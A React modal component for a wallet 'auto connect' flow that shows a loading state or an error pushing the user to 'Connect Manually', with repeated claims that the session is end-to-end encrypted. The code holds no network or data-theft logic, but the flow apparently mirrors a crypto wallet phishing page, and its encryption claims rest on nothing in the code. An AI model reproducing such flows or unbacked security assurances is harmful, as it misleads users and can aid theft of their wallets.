import React from 'react';
import { IoMdClose } from 'react-icons/io';
import Shield from '../../assets/images/shield.png';

const AutoConnect = ({ connectManually, showConnect, resetAll, handleConnectManually, handleTryAgain, clickedName, clickedImage, loadWallet }) => {
    return (
        <div className={`w-full h-full fixed top-0 bottom-0 bg-[#03030365] ${showConnect ? 'block' : 'hidden'}`}>
            {!connectManually && (
                <div className="w-full max-w-[450px] absolute left-1/2 top-[5%] bottom-10 sm:top-1/2 sm:translate-y-[-60%] translate-x-[-50%] drop-shadow-xl p-3">
                    <div className='w-full min-h-[250px] bg-white rounded-xl p-6 text-center relative'>
                        <div className="absolute top-[1%] sm:top-[-2%] right-[1%] sm:right-[-2%] h-6 w-6 bg-white rounded-full grid place-items-center shadow-md">
                            <IoMdClose className="cursor-pointer text-xl" onClick={resetAll} />
                        </div>

                        <img src={clickedImage} alt={clickedName} className="w-12 mx-auto" />
                        <p className="font-semibold text-black text-xl">{clickedName}</p>
                        <p className="text-gray-500 mt-1">This session is secured and encrypted</p>

                        {loadWallet ? (
                            <div className="w-full flex items-center flex-col justify-center mt-6">
                                <div className="min-w-full h-[3px] bg-[#2563EB] relative">
                                    <div className="w-3 h-3 rounded-full top-[50%] translate-y-[-50%] bg-[#2563EB] absolute animate-move"></div>
                                </div>
                                <div className='text-lg font-semibold'>
                                    <p className="text-black text-lg">starting secure connection...</p>
                                    <p className='text-gray-500 italic -mt-2'>please wait...</p>
                                </div>
                            </div>
                        ) : (
                            <div className="w-full mt-6 flex flex-col items-center">
                                <p className="text-red-600 border border-red-600 w-full rounded-md py-[3px] mb-5 text-[10px]">An error occurred... please try again or connect manually</p>
                                <button 
                                    className="border border-[#2563EB] text-[#2563EB] hover:bg-[#2563EB] hover:text-white transition-all ease duration-300 mb-3 px-4 py-2 rounded-3xl w-full" 
                                    onClick={handleTryAgain}
                                >
                                    Try Again
                                </button>
                                <button 
                                    className="bg-[#2563EB] text-white px-4 py-2 rounded-3xl w-full" 
                                    onClick={handleConnectManually}
                                >
                                    Connect Manually
                                </button>
                            </div>
                        )}

                        <div className="w-full flex justify-center mt-6 p-4">
                            <img src={Shield} alt="Shield" className="w-6 h-6 mr-2" />
                            <p className="text-gray-700 text-lg font-semibold">This session is protected with an end-to-end encryption</p>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}

export default AutoConnect;
